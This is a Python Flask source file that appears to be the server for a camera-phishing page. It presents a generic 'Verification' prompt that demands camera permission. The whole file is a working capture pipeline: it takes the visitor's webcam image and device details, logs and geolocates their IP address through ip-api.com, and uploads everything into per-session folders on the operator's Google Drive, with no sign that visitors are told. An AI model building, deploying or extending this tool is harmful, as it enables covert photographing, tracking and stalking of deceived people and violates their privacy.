import os
import uuid
import json
import requests
import pytz
from datetime import datetime
from io import BytesIO

from flask import Flask, render_template, request, jsonify
from google.oauth2.service_account import Credentials
from googleapiclient.discovery import build
from googleapiclient.http import MediaIoBaseUpload

app = Flask(__name__)

# --------------------------------------------------------------------
# 1. Load static configuration
# --------------------------------------------------------------------
def load_config():
    try:
        with open('config.json', 'r') as f:
            return json.load(f)
    except Exception:
        # Fallback values if config.json is missing
        return {
            "site_title": "Verification",
            "greeting_message": "Please start the process",
            "button_text": "Start",
            "loading_message": "Capturing…",
            "denied_message": "Camera permission is required. Close the tab."
        }

# --------------------------------------------------------------------
# 2. Google Drive client
# --------------------------------------------------------------------
GOOGLE_CRED_JSON = os.getenv('GOOGLE_CREDENTIALS_JSON')
ROOT_DRIVE_FOLDER_ID = os.getenv('ROOT_DRIVE_FOLDER_ID')

def get_drive_service():
    creds = Credentials.from_service_account_info(
        json.loads(GOOGLE_CRED_JSON),
        scopes=['https://www.googleapis.com/auth/drive']
    )
    return build('drive', 'v3', credentials=creds)

drive_service = get_drive_service()

# --------------------------------------------------------------------
# 3. Helper: IP → geo‑lookup
# --------------------------------------------------------------------
def ip_location(ip):
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        d = r.json()
        if d['status'] == 'success':
            return {
                'country': d.get('country', ''),
                'city': d.get('city', ''),
                'lat': d.get('lat'),
                'lon': d.get('lon')
            }
    except Exception:
        pass
    return {'country': 'Unknown', 'city': 'Unknown', 'lat': None, 'lon': None}

# --------------------------------------------------------------------
# 4. Routes
# --------------------------------------------------------------------
@app.route('/')
def index():
    cfg = load_config()
    return render_template('index.html', cfg=cfg)

@app.route('/capture', methods=['POST'])
def capture():
    # 4a. Basic checks
    if 'image' not in request.files:
        return jsonify({'error': 'No image'}), 400

    img_file = request.files['image']
    meta_json = request.form.get('metadata')
    client_meta = json.loads(meta_json) if meta_json else {}

    # 4b. Server‑side enrichment
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    ua = request.headers.get('User-Agent', 'Unknown')
    ts = datetime.now(pytz.utc)
    sess_id = str(uuid.uuid4())[:8]
    loc = ip_location(ip)

    # 4c. Prepare metadata.txt
    meta_txt = f"""=== USER SESSION METADATA ===
Session ID: {sess_id}
Timestamp (UTC): {ts.isoformat()}

--- DEVICE INFO ---
Model: {client_meta.get('deviceInfo', {}).get('model', 'Unknown')}
OS: {client_meta.get('deviceInfo', {}).get('os', 'Unknown')}
Browser: {client_meta.get('deviceInfo', {}).get('browser', 'Unknown')}
Screen Res: {client_meta.get('deviceInfo', {}).get('screenRes', 'Unknown')}

--- NETWORK & LOCATION ---
IP Address: {ip}
User Agent: {ua}
Country: {loc.get('country')}
City: {loc.get('city')}
GPS Lat: {loc.get('lat', 'N/A')}
GPS Lon: {loc.get('lon', 'N/A')}
=== END METADATA ===
"""

    try:
        # 4d. Create a dedicated folder for this session
        folder_name = f"User_{sess_id}_{ts.strftime('%Y-%m-%d_%H-%M-%S')}"
        folder_body = {
            'name': folder_name,
            'mimeType': 'application/vnd.google-apps.folder',
            'parents': [ROOT_DRIVE_FOLDER_ID]
        }
        folder = drive_service.files().create(body=folder_body, fields='id').execute()
        folder_id = folder.get('id')

        # 4e. Upload metadata.txt
        meta_bytes = meta_txt.encode('utf-8')
        meta_body = {'name': 'metadata.txt', 'parents': [folder_id]}
        meta_media = MediaIoBaseUpload(BytesIO(meta_bytes), mimetype='text/plain')
        drive_service.files().create(body=meta_body, media_body=meta_media).execute()

        # 4f. Upload the captured image
        img_bytes = img_file.read()
        img_name = f"capture_{ts.strftime('%H-%M-%S-%f')}.jpg"
        img_body = {'name': img_name, 'parents': [folder_id]}
        img_media = MediaIoBaseUpload(BytesIO(img_bytes), mimetype='image/jpeg')
        drive_service.files().create(body=img_body, media_body=img_media).execute()

        return jsonify({'status': 'ok', 'folder_id': folder_id, 'session_id': sess_id})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
